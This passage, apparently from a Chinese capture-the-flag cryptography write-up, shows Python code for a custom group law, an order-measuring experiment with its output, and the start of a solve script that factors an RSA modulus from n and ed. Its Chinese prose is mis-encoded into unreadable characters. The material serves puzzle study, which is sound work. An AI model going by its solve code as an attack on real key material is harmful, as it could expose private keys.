</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>P</span><span class=p>,</span> <span class=n>Q</span><span class=p>,</span> <span class=n>mod</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x1</span><span class=p>,</span> <span class=n>y1</span> <span class=o>=</span> <span class=n>P</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x2</span><span class=p>,</span> <span class=n>y2</span> <span class=o>=</span> <span class=n>Q</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x2</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>P</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x1</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>Q</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>y1</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>y2</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>%</span> <span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>y</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>x2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>y1</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>y2</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>x1</span><span class=p>,</span> <span class=n>y1</span><span class=p>,</span> <span class=n>x2</span><span class=p>,</span> <span class=n>y2</span> <span class=o>=</span> <span class=n>x2</span><span class=p>,</span> <span class=n>y2</span><span class=p>,</span> <span class=n>x1</span><span class=p>,</span> <span class=n>y1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>y2</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>x2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>x2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>y</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>y1</span> <span class=o>*</span> <span class=n>x2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>x2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=p>(</span><span class=n>x1</span> <span class=o>-</span> <span class=n>y1</span> <span class=o>**</span> <span class=mi>2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>x1</span> <span class=o>-</span> <span class=n>y1</span> <span class=o>**</span> <span class=mi>2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>y1</span> <span class=o>*</span> <span class=n>y2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>y2</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>y1</span> <span class=o>*</span> <span class=n>y2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>y</span> <span class=o>=</span> <span class=p>(</span><span class=n>y1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>x1</span> <span class=o>*</span> <span class=n>y2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>x1</span> <span class=o>+</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>y1</span> <span class=o>*</span> <span class=n>y2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=p>(</span><span class=n>y1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>x1</span> <span class=o>*</span> <span class=n>y2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=p>(</span><span class=n>y1</span> <span class=o>+</span> <span class=n>y2</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>y1</span> <span class=o>*</span> <span class=n>x2</span> <span class=o>+</span> <span class=n>x1</span> <span class=o>*</span> <span class=n>y2</span> <span class=o>+</span> <span class=mi>2</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span> <span class=o>%</span> <span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>myPower</span><span class=p>(</span><span class=n>P</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>mod</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>P</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>a</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>a</span> <span class=o>%</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>target</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>&gt;&gt;=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>target</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>genPrime</span><span class=p>(</span><span class=n>nbits</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=n>nbits</span> <span class=o>//</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=n>nbits</span> <span class=o>//</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>b</span> <span class=o>%</span> <span class=mi>3</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>a</span> <span class=o>**</span> <span class=mi>2</span> <span class=o>+</span> <span class=mi>3</span> <span class=o>*</span> <span class=n>b</span> <span class=o>**</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>p</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span> <span class=o>==</span> <span class=n>nbits</span> <span class=ow>and</span> <span class=n>p</span> <span class=o>%</span> <span class=mi>3</span> <span class=o>==</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>p</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>order</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>p</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>myPower</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span> <span class=o>==</span> <span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>test</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;p</span><span class=se>\t\t</span><span class=s2>order</span><span class=se>\t\t</span><span class=s2>p^2</span><span class=se>\t\t\t</span><span class=s2>p^3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>genPrime</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=se>\t\t</span><span class=si>%d</span><span class=se>\t\t</span><span class=si>%d</span><span class=se>\t\t</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>order</span><span class=p>(</span><span class=n>test</span><span class=p>,</span> <span class=n>p</span><span class=p>),</span> <span class=n>p</span> <span class=o>**</span> <span class=mi>2</span><span class=p>,</span> <span class=n>p</span> <span class=o>**</span> <span class=mi>3</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>åˆ†æè¾“å‡ºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Apache data-lang=Apache><span class=line><span class=cl><span class=nb>p</span>        order       p^2         p^3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>199</span>        <span class=err>13267</span>       <span class=err>39601</span>       <span class=err>7880599</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>199</span>        <span class=err>13267</span>       <span class=err>39601</span>       <span class=err>7880599</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>211</span>        <span class=err>14911</span>       <span class=err>44521</span>       <span class=err>9393931</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>199</span>        <span class=err>13267</span>       <span class=err>39601</span>       <span class=err>7880599</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>181</span>        <span class=err>10981</span>       <span class=err>32761</span>       <span class=err>5929741</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>163</span>        <span class=err>1273</span>        <span class=err>26569</span>       <span class=err>4330747</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>211</span>        <span class=err>14911</span>       <span class=err>44521</span>       <span class=err>9393931</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>193</span>        <span class=err>12481</span>       <span class=err>37249</span>       <span class=err>7189057</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>151</span>        <span class=err>7651</span>        <span class=err>22801</span>       <span class=err>3442951</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>241</span>        <span class=err>19441</span>       <span class=err>58081</span>       <span class=err>13997521</span>
</span></span></code></pre></td></tr></table></div></div><p>å‘ç°ï¼Œ$p^3-1$éƒ½æ˜¯orderçš„å€æ•°ã€‚é‚£ä¹ˆå®Œå…¨å¯ä»¥å½“ä½œé˜¶æ¥ç”¨ã€‚åˆå› ä¸ºflagä¸ä¼šå¤ªå¤§ï¼Œå› æ­¤é¢˜ç›®ä¸­ç”¨çš„æ¨¡æ•°<code>pad*N</code>å®Œå…¨å¯ä»¥ç”¨<code>p</code>æˆ–è€…<code>q</code>ä»£æ›¿ï¼Œè¿™æ ·è¿™ä¸ªé¢˜å°±åšå‡ºæ¥äº†ã€‚</p><p>expå¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>math</span> <span class=kn>import</span> <span class=n>gcd</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>inverse</span><span class=p>,</span> <span class=n>long_to_bytes</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>RSAdecompose</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>ed</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=n>ed</span> <span class=o>-</span> <span class=mi>1</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=mi>0</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>tmp</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>+=</span> <span class=mi>1</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>//=</span> <span class=mi>2</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>tmp</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>A</span> <span class=o>=</span> <span class=mi>0</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>I</span> <span class=o>=</span> <span class=mi>0</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>find</span> <span class=o>=</span> <span class=kc>False</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>a</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>s</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>pow</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=nb>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>t</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1</span> <span class=ow>and</span> <span class=nb>pow</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=nb>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>t</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>!=</span> <span class=n>n</span> <span class=o>-</span> <span class=mi>1</span> <span class=ow>and</span> <span class=nb>pow</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=nb>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>i</span><span class=p>)</span> <span class=o>*</span> <span class=n>t</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>A</span> <span class=o>=</span> <span class=n>a</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>I</span> <span class=o>=</span> <span class=n>i</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>find</span> <span class=o>=</span> <span class=kc>True</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>break</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>find</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>break</span> 
